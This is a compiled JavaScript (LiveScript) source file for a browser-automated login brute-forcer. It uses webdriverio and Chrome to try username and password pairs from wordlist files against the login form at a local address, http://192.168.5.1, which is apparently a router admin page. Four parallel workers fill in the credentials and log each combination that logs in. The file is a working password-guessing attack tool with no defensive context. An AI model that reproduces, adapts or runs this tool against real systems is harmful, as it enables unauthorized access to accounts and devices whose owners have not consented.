// Generated by LiveScript 1.4.0
(function(){
  var webdriverio, p, h, _, lbl, colors, options, BruteForcer, bruteForcer, bf, workerN, spawnWorker;
  webdriverio = require('webdriverio');
  p = require('bluebird');
  h = require('helpers');
  _ = require('underscore');
  lbl = require('line-by-line');
  colors = require('colors');
  options = {
    desiredCapabilities: {
      browserName: 'chrome'
    }
  };
  BruteForcer = (function(){
    BruteForcer.displayName = 'BruteForcer';
    var prototype = BruteForcer.prototype, constructor = BruteForcer;
    function BruteForcer(userList, passList){
      var this$ = this;
      this.userList = userList;
      this.passList = passList;
      this.ulr = new lbl(this.userList);
      this.plr = new lbl(this.passList);
      this.ulr.pause();
      this.plr.pause();
      this.ulr.on('end', function(){
        return this$.ended = true;
      });
      this.plr.on('end', function(){
        return console.log('password list end, creating a new one');
      });
      this.requests = [];
    }
    prototype.getUser = function(){
      var this$ = this;
      return new p(function(resolve, reject){
        if (this$.user != null) {
          return resolve(this$.user);
        }
        this$.ulr.once('line', function(user){
          this$.ulr.pause();
          return resolve(this$.user = user);
        });
        return this$.ulr.resume();
      });
    };
    prototype.getPass = function(){
      var this$ = this;
      return new p(function(resolve, reject){
        var endListener;
        endListener = void 8;
        this$.plr.once('line', function(pass){
          this$.plr.removeListener('end', endListener);
          this$.plr.pause();
          return resolve(pass);
        });
        this$.plr.once('end', endListener = function(){
          this$.plr = new lbl(this$.passList);
          this$.plr.pause();
          delete this$.user;
          return resolve(this$.getPass());
        });
        return this$.plr.resume();
      });
    };
    prototype.work = function(){
      var this$ = this;
      this.working = true;
      return p.all([this.getUser(), this.getPass()]).then(function(login){
        this$.requests.shift()({
          user: login[0],
          pass: login[1]
        });
        if (this$.requests.length) {
          return this$.work();
        } else {
          return this$.working = false;
        }
      });
    };
    prototype.next = function(){
      var this$ = this;
      if (this.ended) {
        return reject("ended");
      }
      return new p(function(resolve, reject){
        this$.requests.push(resolve);
        if (!this$.working) {
          return this$.work();
        }
      });
    };
    return BruteForcer;
  }());
  bruteForcer = new BruteForcer('user.txt', 'pass.txt');
  bf = function(page){
    return page.timeoutsImplicitWait(500).bruteforce(bruteForcer).then(function(it){
      return console.log("PASS", it);
    }, function(err){
      return console.log("FAIL", err);
    });
  };
  workerN = 0;
  spawnWorker = function(){
    var n, page;
    n = workerN++;
    page = webdriverio.remote(options).init();
    page.addCommand("bruteforce", function(bruteForcer){
      var loopy, this$ = this;
      loopy = function(){
        return bruteForcer.next().then(function(login){
          console.log("trying " + login.user + ":" + login.pass);
          return this$.waitForExist('.username', 3000).setValue('.username', login.user).setValue('.password', login.pass).click('.login').waitForExist('#myLayer', 3000).then(loopy, function(){
            return console.log(colors.green("Worker " + n + " finished with combo " + login.user + " " + login.pass));
          });
        });
      };
      return loopy();
    });
    page.timeoutsImplicitWait(200).url('http://192.168.5.1').title(function(err, res){
      return console.log('title: ' + res.value);
    });
    return bf(page);
  };
  spawnWorker();
  spawnWorker();
  spawnWorker();
  spawnWorker();
}).call(this);
